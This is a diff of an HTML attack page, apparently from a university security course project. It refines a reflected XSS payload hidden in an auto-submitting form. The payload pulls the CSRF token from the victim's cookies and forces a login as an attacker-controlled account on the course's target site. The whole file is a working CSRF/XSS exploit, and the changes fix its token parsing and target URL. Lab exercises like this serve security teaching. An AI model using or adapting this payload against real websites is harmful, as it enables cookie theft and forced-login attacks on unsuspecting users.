@@ -17,6 +17,8 @@
             method="GET"
             target="frame"
         >
+            <input name="csrfdefense" value="1" type="hidden" />
+            <input name="xssdefense" value="0" type="hidden" />
             <input
                 type="hidden"
                 id="query"
@@ -24,15 +26,15 @@
                 value="
                   <script>
                     $(function(){
-                      var pwned = document.cookie.split(';')[1].split('-')[1];
-                      var url = 'http://project2.ecen4113.org/' + 'login?csrfdefense=1&xssdefense=0'
-                      $.post(url, { username: 'attacker', password: 'l33th4x', csrf_token: pwned});
+                      var pwned = document.cookie.split(';')[0].split('=')[1];
+                      url = 'https://project2.ecen4133.org/login?csrfdefense=1&xssdefense=0';
+                      $.post(url, {username: 'attacker', password: 'l33th4x', csrf_token: pwned});
                     });
                   </script>"
             />
         </form>
         <script>
-          document.getElementById('myForm').submit();
+            document.getElementById('myForm').submit()
         </script>
     </body>
 </html>
